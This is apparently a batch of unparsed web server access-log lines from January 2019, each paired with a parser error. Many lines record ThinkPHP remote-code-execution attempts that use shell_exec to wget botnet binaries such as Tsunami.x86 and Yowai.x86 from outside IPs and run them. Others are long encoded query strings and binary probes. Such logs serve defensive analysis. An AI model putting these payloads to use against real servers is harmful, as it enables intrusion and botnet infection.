759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('112.28.77.213 - - [23/Jan/2019:11:24:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('122.196.231.141 - - [23/Jan/2019:11:39:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('91.99.30.32 - - [23/Jan/2019:11:43:33 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2" 414 186 "-" "-" "-"\n', 'list index out of range')
('74.82.17.87 - - [23/Jan/2019:11:53:42 +0330] "&\\xBEi\\x86p\\xBAOt}U\\x95\\xB3\\x5C\\x1F\\x02\\x1D\\x84\\xD7\\xAA{3]\\x1B\\x9BK\\xE2\\xEF\\xF79\\xBB\\xFD\\x05g\\xFB\\x1B\\xE5\\xFD1\\xCEJ\\xFB\\xD0\\xBE\\xF8/\\xBD_y\\xE0WX\\xF7,]\\xDC\\xBD\\xFE\\xE5\\xD5\\x7Fr\\xA5\\x9B\\xFB\\x97H[v\\x7F\\xF3\\xE2\\xEELa\\xCA:\\x10\\xEE\\xC5^K\\xE0\\xBF\\x09\\xE0Uy\\x1F\\x81[\\x5C\\x8C\\xF8\\xA3<\\x90\\xF8\\xAB\\x1F\\xD8\\xDF$\\xE0p\\x96\\xFF\\x00\\xDC\\x11\\xE4v3\\xD2\\x98\\xA8" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.82.17.87 - - [23/Jan/2019:11:55:26 +0330] "E\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x039\\xDCt\\xBD\\xC3\\x84\\x0B\\xE6\\x12\\xF4\\xE2\\xE3\\x8DU\\x1D[\\xE0\\xCCT\\xAF\\xFF\\xE5\\xE1\\xF6\\x9C\\xD4\\x87\\xD3\\x9E\\xFA\\xAA\\x16 \\xEC\\x9E\\x15\\xAB~_j\\xA6\\x96:\\xED9\\xA59\\xE9[t\\xCF\\x86\\xAA\\x93\\x88K\\x85\\xD4FhU=b\\x88]\\x00\\x1E\\xC0+\\xC0/\\xCC\\xA9\\xCC\\xA8\\xC0,\\xC00\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('58.186.25.218 - - [23/Jan/2019:11:56:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.66 - - [23/Jan/2019:12:07:16 +0330] "\\x00\\x84\\x00\\x01\\x01\\x01\\x01\\x01\\x04\\xD2\\x00\\xA7\\x12\\xC2\\x10\\xC8D*\\xA3\\x17\\xE2\\xD9" 400 166 "-" "-" "-"\n', 'list index out of range')
('213.41.230.66 - - [23/Jan/2019:12:37:02 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('74.82.60.85 - - [23/Jan/2019:12:43:24 +0330] "\\x05bE\\x00\\x05b\\x00\\x00@\\x00:\\x11\\x8E\\x18\\xAD\\xC2\\xA6\\xAA" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.82.60.85 - - [23/Jan/2019:12:43:27 +0330] "\\x00\\x00\\x00\\x03\\x16edge-stun.facebook.com" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.82.60.85 - - [23/Jan/2019:12:47:00 +0330] "\\x05bE\\x00\\x05b\\x00\\x00@\\x00:\\x11\\xDC\\xCBJ}\\xA6\\x8A" 400 166 "-" "-" "-"\n', 'list index out of range')
('42.118.241.13 - - [23/Jan/2019:13:18:21 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('37.29.32.137 - - [23/Jan/2019:13:18:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('117.198.103.116 - - [23/Jan/2019:13:25:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('89.46.222.181 - - [23/Jan/2019:13:27:55 +0330] "GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp" 400 166 "-" "-" "-"\n', 'list index out of range')
('58.216.145.214 - - [23/Jan/2019:14:07:17 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('88.71.38.235 - - [23/Jan/2019:14:10:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('153.145.147.89 - - [23/Jan/2019:14:30:33 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('85.99.114.34 - - [23/Jan/2019:14:31:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('61.86.79.193 - - [23/Jan/2019:15:08:09 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('31.163.179.129 - - [23/Jan/2019:15:10:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('5.117.116.238 - - [23/Jan/2019:15:25:25 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:25538},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[51990]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[52655,%2052656,%2052657,%2052658,%2052659,%2052660,%2052661,%2052662,%2052663,%2052665]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[544830,%20546600,%20550351,%20553443,%20560398,%20562693,%20562711,%20563201,%20563612,%20596195,%20616862,%20619229,%20658829,%20710492,%20711098,%20828002,%20992279,%201035525,%201049985,%201077057,%201093845,%201120584,%201133461,%201167502,%201199142,%201243639,%201252993,%201260212,%201268963,%201271146,%201275637,%201285275,%201290628,%201302637,%201314616,%201325630,%201338198,%201353457,%201377565,%201384634,%201397936,%201399349,%201405002,%201419008,%201431512,%201446966,%201475130,%201490551,%201521345,%201539907,%201616908,%201629906,%201665472,%201731786,%201754922,%20544831,%20546601,%20550352,%20553444,%20560399,%20562695,%20562713,%20563202,%20563613,%20596196,%20616863,%20619230,%20658830,%20710493,%20711099,%20828003,%20992280,%201035526,%201049986,%201077058,%201093846,%201120585,%201133462,%201167503,%201199143,%201243640,%201252994,%201260213,%201268964,%201271147,%201275638,%201285276,%201290629,%201302638,%201314617,%201325631,%201338199,%201353458,%201377567,%201384636,%201397938,%201399351,%201405004,%201419010,%201431514,%201446968,%201475132,%201490553,%201521347,%201539909,%201616910,%201629908,%201665474,%201731788,%201754924,%20544832,%20546602,%20550353,%20553445,%20560400,%20562697,%20562715,%20563203,%20563614,%20596197,%20616864,%20619231,%20658831,%20710494,%20711100,%20828004,%20992281,%201035527,%201049987,%201077059,%201093847,%201120586,%201133463,%201167504,%201199144,%201243641,%201252995,%201260214,%201268965,%201271148,%201275639,%201285277,%201290630,%201302639,%201314618,%201325632,%201338200,%201353459,%201377569,%201384638,%201397940,%201399353,%201405006,%201419012,%201431516,%201446970,%201475134,%201490555,%201521349,%201539911,%201616912,%201629910,%201665476,%201731790,%201754926,%20544833,%20546603,%20550354,%20553446,%20560401,%20562699,%20562717,%20563204,%20563615,%20596198,%20619232,%20658832,%20710495,%20711101,%20828005,%20992282,%201035528,%201049988,%201077060,%201093848,%201120587,%201133464,%201167505,%201199145,%201243642,%201252996,%201260215,%201268966,%201271149,%201275640,%201285278,%201290631,%201302640,%201314619,%201325633,%201338201,%201353460,%201377571,%201384640,%201397942,%201399355,%201405008,%201419014,%201431518,%201446972,%201475136,%201490557,%201521351,%201539913,%201616914,%201629912,%201665478,%201731792,%201754928,%20544834,%20546604,%20550355,%20553447,%20560402,%20562701,%20562719,%20563205,%20563616,%20596199,%20616865,%20619233,%20658833,%20710496,%20711102,%20828006,%20992283,%201035529,%201049994,%201077061,%201093849,%201120588,%201133465,%201167506,%201199146,%201243643,%201252997,%201260216,%201268967,%201271150,%201275641,%201285279,%201290632,%201302641,%201314620,%201325634,%201338202,%201353461,%201377573,%201384642,%201397944,%201399357,%201405010,%201419016,%201431520,%201446974,%201475138,%201490559,%201521353,%201539915,%201616916,%201629914,%201665480,%201731794,%201754930,%20544835,%20546605,%20550356,%20553448,%20560403,%20562703,%20562721,%20563206,%20563617,%20596200,%20616866,%20619234,%20658834,%20710497,%20711103,%20828007,%20992284,%201035530,%201049993,%201077062,%201093850,%201120589,%201133466,%201167507,%201199147,%201243644,%201252998,%201260217,%201268968,%201271151,%201275642,%201285280,%201290633,%201302642,%201314621,%201325635,%201338203,%201353462,%201377575,%201384644,%201397946,%201399359,%201405012,%201419018,%201431522,%201446976,%201475140,%201490561,%201521355,%201539917,%201616918,%201629916,%201665482,%201731796,%201754932,%20544836,%20546606,%20550357,%20553449,%20560404,%20562704,%20562723,%20563207,%20563618,%20596201,%20616867,%20619235,%20658835,%20710498,%20711104,%20828008,%20992285,%201035531,%201049992,%201077063,%201093851,%201120590,%201133467,%201167508,%201199148,%201243645,%201252999,%201260218,%201268969,%201271152,%201275643,%201285281,%201290634,%201302643,%201314622,%201325636,%201338204,%201353463,%201377577,%201384646,%201397948,%201399361,%201405014,%201419020,%201431524,%201446978,%201475142,%201490563,%201521357,%201539919,%201616920,%201629918,%201665484,%201731798,%201754934,%20544837,%20546607,%20550358,%20553450,%20560405,%20562706,%20562724,%20563208,%20563619,%20596202,%20616868,%20619236,%20658836,%20710499,%20711105,%20828009,%20992286,%201035532,%201049991,%201077064,%201093852,%201120591,%201133468,%201167509,%201199149,%201243646,%201253000,%201260219,%201268970,%201271153,%201275644,%201285282,%201290635,%201302644,%201314623,%201325637,%201338205,%201353464,%201377579,%201384648,%201397950,%201399363,%201405016,%201419022,%201431526,%201446980,%201475144,%201490565,%201521359,%201539921,%201616922,%201629920,%201665486,%201731800,%201754936,%20544838,%20546608,%20550359,%20553451,%20560406,%20562708,%20562726,%20563209,%20563620,%20596203,%20616869,%20619237,%20658837,%20710500,%20711106,%20828010,%20992287,%201035533,%201049990,%201077065,%201093853,%201120592,%201133469,%201167510,%201199150,%201243647,%201253001,%201260220,%201268971,%201271154,%201275645,%201285283,%201290636,%201302645,%201314624,%201325638,%201338206,%201353465,%201377581,%201384650,%201397952,%201399365,%201405018,%201419024,%201431528,%201446982,%201475146,%201490567,%201521361,%201539923,%201616924,%201629922,%201665488,%201731802,%201754938,%20544839,%20546609,%20550360,%20553452,%20560407,%20562710,%20562728,%20563210,%20563621,%20596204,%20616870,%" 414 186 "-" "-" "-"\n', 'list index out of range')
('193.250.60.181 - - [23/Jan/2019:15:48:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('219.145.246.35 - - [23/Jan/2019:16:11:50 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('37.29.35.152 - - [23/Jan/2019:16:46:40 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('112.137.114.117 - - [23/Jan/2019:17:03:43 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
